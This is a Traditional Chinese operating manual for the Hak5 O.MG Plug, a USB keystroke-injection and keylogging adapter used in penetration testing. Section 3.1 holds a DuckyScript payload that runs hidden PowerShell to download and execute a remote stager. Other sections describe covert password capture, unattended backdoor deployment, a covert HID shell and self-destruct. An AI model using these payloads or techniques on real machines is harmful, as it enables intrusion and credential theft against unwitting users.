---
title: "Hak5 O.MG Plug & Adapter 原廠技術說明書與全功能操作手冊"
model: "O.MG Plug"
manufacturer: "Hak5"
category: "模組化串接式 USB 實體攻擊與按鍵注入轉接頭 (Modular USB Adapter)"
docs_url: "https://o.mg.lol/setup/OMGPlug/"
version: "3.0"
locale: "zh-tw"
---

# Hak5 O.MG Plug & Adapter 原廠技術說明書與全功能操作手冊

> Hak5 出品的 O.MG Plug（以及 O.MG Adapter 轉接器）是 O.MG 滲透測試體系的模組化實體演進版本。將完整的 O.MG SoC 晶片組、802.11 Wi-Fi 無線電與 DuckyScript 攻擊引擎精準封裝於通用型 USB 轉接頭外殼中，支援串接任意周邊鍵盤與設備，或作為無人值守的獨立 USB 快速攻擊載具。

---

## 目錄

- [**1. 產品概述與硬體架構**](#1-產品概述與硬體架構)
  - [1.1 模組化轉接頭設計理念](#11-模組化轉接頭設計理念)
  - [1.2 技術規格與硬體校準基準表](#12-技術規格與硬體校準基準表)
  - [1.3 串接攔截與無人值守雙重部署模式](#13-串接攔截與無人值守雙重部署模式)
- [**2. 硬體初始化、韌體燒錄與網路連線**](#2-硬體初始化韌體燒錄與網路連線)
  - [2.1 使用 O.MG Programmer 進行初次啟用](#21-使用-omg-programmer-進行初次啟用)
  - [2.2 Web Flasher 瀏覽器序列燒錄指引](#22-web-flasher-瀏覽器序列燒錄指引)
  - [2.3 建立 Wi-Fi 管理無線基地台](#23-建立-wi-fi-管理無線基地台)
  - [2.4 網頁控制台功能巡禮與參數調整](#24-網頁控制台功能巡禮與參數調整)
- [**3. 酬載編寫、DuckyScript 語法與執行模式**](#3-酬載編寫-duckyscript-語法與執行模式)
  - [3.1 DuckyScript for O.MG Plug 核心指令](#31-duckyscript-for-omg-plug-核心指令)
  - [3.2 酬載槽位架構與遠端快速觸發](#32-酬載槽位架構與遠端快速觸發)
  - [3.3 串聯 USB 實體鍵盤側錄機制 (Keylogger)](#33-串聯-usb-實體鍵盤側錄機制-keylogger)
  - [3.4 跨國鍵盤設定對應與轉譯](#34-跨國鍵盤設定對應與轉譯)
- [**4. HIDX StealthLink 隱蔽傳輸與艦隊管理**](#4-hidx-stealthlink-隱蔽傳輸與艦隊管理)
  - [4.1 HIDX 雙向通道原理說明](#41-hidx-雙向通道原理說明)
  - [4.2 跨平台互動式端點管道](#42-跨平台互動式端點管道)
  - [4.3 Hak5 Cloud C² 雲端集中艦隊納管](#43-hak5-cloud-c-雲端集中艦隊納管)
  - [4.4 WebSocket API 自動化串接實例](#44-websocket-api-自動化串接實例)
- [**5. 安全防禦、自毀抹除與維護指南**](#5-安全防禦自毀抹除與維護指南)
  - [5.1 地理圍欄環境限制設定](#51-地理圍欄環境限制設定)
  - [5.2 緊急硬體自毀標準程序](#52-緊急硬體自毀標準程序)
  - [5.3 故障排查、晶片校準與出廠重置](#53-故障排查晶片校準與出廠重置)

---

## 1. 產品概述與硬體架構

<!-- section：overview -->
本章節說明 O.MG Plug / Adapter 的模組化硬體架構、規格參數與部署形式。

### 1.1 模組化轉接頭設計理念

O.MG Cable 將攻擊晶片深嵌於一條專屬線纜中；而 O.MG Plug 則將這套先進的微型系統封裝成通用的轉接插頭（提供 USB Type-A 插頭與 USB Type-C 轉接器等多種形式）。

此設計具備極大優勢：
- **相容任意品牌線材**：現場可隨意串接目標既有的專用傳輸線、條碼掃描器、滑鼠或機械鍵盤。
- **隨機應變部署**：既可安插在主機後方充當長期串接鍵盤側錄器，亦可做為無人值守的一鍵注入 USB Key。
- **高耐用性外殼**：金屬強化結構，經得起多次實體插拔。

### 1.2 技術規格與硬體校準基準表

| 硬體元件專案 | 原廠官方技術規格基準 |
|---|---|
| **設備架構** | 模組化串接式 USB 實體攻擊轉接頭 |
| **射頻無線電** | 整合式 802.11 b/g/n (2.4 GHz) Wi-Fi 無線電與微型天線 |
| **輸入工作電壓** | 5 V DC (+/- 0.5 V) 經由主機 USB 連接埠供電 |
| **功耗標準** | 待機：~75 mA；尖峰發射：~320 mA；建議供電：500 mA |
| **資料通訊透傳** | 完整 USB 2.0 (480 Mbps) 全速透傳通道 (攻擊閒置時完全透明) |
| **電力透傳規格** | 固定 5 V 導通；USB-PD 協商最高限制於 5 V |
| **物理規格外觀** | USB Type-A 轉接頭、USB Type-C 模組化插頭 |
| **儲存磁區規模** | 非揮發性 Flash 空間 (Basic：8 槽位；Plus/Elite：最高 200 槽位) |
| **側錄容量規格** | Keylogger 版：內建約 650,000 次按鍵先進先出 (FIFO) 緩衝記憶體 |
| **硬體相容標準** | Full Speed 全速 USB 鍵盤 (相容 12 Mbps 標準 HID 規範) |
| **隱蔽通道技術** | HIDX StealthLink (利用底層 HID Reports 實現雙向 Shell) |
| **防護安全機制** | WPA2 加密、BSSID 地理圍欄防禦、微控制器緊急自毀功能 |

### 1.3 串接攔截與無人值守雙重部署模式

1. **串接周邊攔截模式 (Inline Peripheral Interception Mode)**：
   - 將 O.MG Plug 插入目標主機 USB 孔，再將目標實體鍵盤插入 O.MG Plug 的母座。
   - 使用者日常打字完全無感，但所有擊鍵均被即時記錄，且操作者可隨時透過無線射頻注入攻擊指令。
2. **無人值守隨身注入模式 (Unattended Standalone Dongle Mode)**：
   - 直接將 O.MG Plug 插入無人看管的目標伺服器或資訊站（Kiosk）。
   - 設備自動感知主機通電，數秒內依序派發提權、下載後門與資料導出指令碼。

---

## 2. 硬體初始化、韌體燒錄與網路連線

<!-- section：configuration -->
本章節說明 O.MG Plug 的出廠啟用、瀏覽器序列燒錄與連線流程。

### 2.1 使用 O.MG Programmer 進行初次啟用

所有 O.MG Plug 設備均需使用 O.MG Programmer 啟用無線發射功能：
1. 將 O.MG Plug 公頭插入 O.MG Programmer 母座。
2. 將 Programmer 連接至工作站電腦，確認供電指示燈恆亮。

### 2.2 Web Flasher 瀏覽器序列燒錄指引

1. 使用 Chrome 或相容 WebSerial 之瀏覽器造訪：`https://o-mg.github.io/WebFlasher/`
2. 點選 **Connect** 並選取 CP2102 序列埠。
3. 產品選單選取 **O.MG Plug / Adapter**，點選最新韌體進行一鍵刷機。

### 2.3 建立 Wi-Fi 管理無線基地台

1. 拔除 Programmer，將 O.MG Plug 插入一般 5 V USB 供電孔。
2. 連線至預設基地台：
   - **SSID**：`O.MG`
   - **密碼**：`12345678`
3. 瀏覽器開啟 `http://192.168.4.1` 進入設定後台。

### 2.4 網頁控制台功能巡禮與參數調整

- **Payloads 頁面**：編寫、上傳與點選執行腳本。
- **Keylogger 頁面**：即時監看擊鍵日誌與文字搜尋。
- **Settings 頁面**：更改無線名稱、加入公司 Wi-Fi（Station 模式）或設定自毀條件。

---

## 3. 酬載編寫、DuckyScript 語法與執行模式

<!-- section：features -->
本章節說明 DuckyScript 指令撰寫與鍵盤攔截操作。

### 3.1 DuckyScript for O.MG Plug 核心指令

```text
REM O.MG Plug Fast Execution Example
DELAY 2000
GUI r
DELAY 300
STRING powershell -w hidden -c「Invoke-RestMethod http://192.168.4.1/stager | iex」
ENTER
```

支援 `DELAY` 延遲、`STRING` 鍵入、`USB_OVERCLOCK` 傳輸加速與 `WAIT_FOR_INPUT` 操作員確認指令。

### 3.2 酬載槽位架構與遠端快速觸發

Plus 與 Elite 版本支援高達 200 個槽位，操作者可在手機 Web 介面建立自訂捷徑按鈕，於百公尺外隨點隨打。

### 3.3 串聯 USB 實體鍵盤側錄機制 (Keylogger)

串接鍵盤時，O.MG Plug 的專用處理核心會並行解析 USB 封包，並將密碼、指令與機密即時加密儲存於非揮發記憶體中，操作者可在網頁端即時觀看。

### 3.4 跨國鍵盤設定對應與轉譯

內建多語系映射核心，支援全球各大主要語系鍵盤，確保在非英文環境下輸入符號依然百分之百精準。

---

## 4. HIDX StealthLink 隱蔽傳輸與艦隊管理

### 4.1 HIDX 雙向通道原理說明

利用 USB HID 協定規範的 Feature Reports 通訊機制，不需要開啟任何網路連接埠、不安裝驅動，直接打通目標主機與 O.MG Plug 之間的雙向通道。

### 4.2 跨平台互動式端點管道

支援在 Windows（PowerShell）、Linux（Bash）與 macOS（Python）環境下反向引導出完全互動式的端點機控制台。

### 4.3 Hak5 Cloud C² 雲端集中艦隊納管

將各辦公室部署的 O.MG Plug 設定為 Station 模式連上網際網路，即可在 Hak5 Cloud C² 雲端後台集中調度與監管。

### 4.4 WebSocket API 自動化串接實例

開放標準 WebSocket 介面，方便資安工程師以 Python 撰寫自動化外掛，達成自動側錄、敏感詞通知與主動回擊。

---

## 5. 安全防禦、自毀抹除與維護指南

<!-- section：maintenance -->
本章節介紹自毀保護、地理圍欄與出廠重置。

### 5.1 地理圍欄環境限制設定

鎖定現場特定 Wi-Fi BSSID，一旦離開受測區域即自動切斷連線或進入深度休眠。

### 5.2 緊急硬體自毀標準程序

發動 `Self-Destruct` 指令後，微控制器會立即對晶片內部進行高壓隨機覆寫並自毀引導程式，使物理逆向工程徹底失效。

### 5.3 故障排查、晶片校準與出廠重置

若遇通訊異常，可將 O.MG Plug 插回 O.MG Programmer，利用 Web Flasher 進行「Erase Flash & Factory Reset」即可還原初始設定。
